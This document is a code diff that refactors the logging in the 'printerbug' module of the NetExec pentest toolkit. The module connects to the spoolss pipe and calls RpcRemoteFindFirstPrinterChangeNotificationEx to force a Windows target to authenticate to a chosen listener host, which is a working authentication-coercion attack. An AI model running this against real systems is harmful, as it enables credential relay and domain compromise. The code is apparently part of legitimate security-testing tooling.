@@ -1,10 +1,9 @@
 from impacket.dcerpc.v5 import transport, rprn
-from nxc.logger import nxc_logger
 
 
 class NXCModule:
     name = "printerbug"
-    description = "Module to check if the Target is vulnerable to PrinterBug"
+    description = "Module to check if the Target is vulnerable to PrinterBug. Set LISTENER IP for coercion."
     supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
@@ -21,7 +20,7 @@ class NXCModule:
             self.listener = module_options["LISTENER"]
 
     def on_login(self, context, connection):
-        trigger = TriggerAuth()
+        trigger = TriggerAuth(context)
         target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
         dce = trigger.connect(
             username=connection.username,
@@ -39,7 +38,6 @@ class NXCModule:
             context.log.debug("Target is vulnerable to PrinterBug")
             trigger.RpcRemoteFindFirstPrinterChange(dce, self.listener, target)
             context.log.highlight("VULNERABLE")
-            context.log.highlight("Next step: https://github.com/dirkjanm/krbrelayx")
             dce.disconnect()
 
         else:
@@ -53,6 +51,8 @@ class NXCModule:
 
 
 class TriggerAuth:
+    def __init__(self, context):
+        self.context = context
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost):
         
         rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\PIPE\spoolss]" % target)
@@ -70,41 +70,40 @@ class TriggerAuth:
 
         if doKerberos:
             rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
-        # if target:
 
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
-        nxc_logger.debug("[-] Connecting to {}".format(r"ncacn_np:%s[\PIPE\spoolfs]") % target)
+        self.context.log.debug("Connecting to {}".format(r"ncacn_np:%s[\PIPE\spoolfs]") % target)
         try:
             dce.connect()
         except Exception as e:
-            nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
+            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
             return None
         try:
             dce.bind(rprn.MSRPC_UUID_RPRN)            
         except Exception as e:
-            nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
+            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
             return None
-        nxc_logger.debug("[+] Successfully bound!")
+        self.context.log.debug("Successfully bound!")
         return dce
 
     def RpcRemoteFindFirstPrinterChange(self, dce, listener, target):
-        nxc_logger.debug("[-] Sending RpcRemoteFindFirstPrinterChange!")
+        self.context.log.debug("Sending RpcRemoteFindFirstPrinterChange!")
         try:
             resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
         except Exception as e:
             if str(e).find("Broken pipe") >= 0:
                 # The connection timed-out. Let's try to bring it back next round
-                nxc_logger.error("Connection failed - skipping host!")
+                self.context.log.error("Connection failed - skipping host!")
                 return
             elif str(e).upper().find("ACCESS_DENIED"):
                 # We're not admin, bye
-                nxc_logger.error("Access denied - RPC call was denied")
+                self.context.log.error("Access denied - RPC call was denied")
                 dce.disconnect()
                 return
             else:
                 raise
-        nxc_logger.debug("Got handle")
+        self.context.log.debug("Got handle")
 
         try:
             request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
@@ -112,11 +111,11 @@ class TriggerAuth:
             request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
             request["pszLocalMachine"] = "\\\\%s\x00" % listener
             request["pOptions"] = None
-            nxc_logger.debug(request.dump())
+            self.context.log.debug(request.dump())
         except Exception as e:
-            nxc_logger.debug(e)
+            self.context.log.debug(e)
 
         try:
             dce.request(request)
         except Exception as e:
-            nxc_logger.debug(e)
+            self.context.log.debug(e)
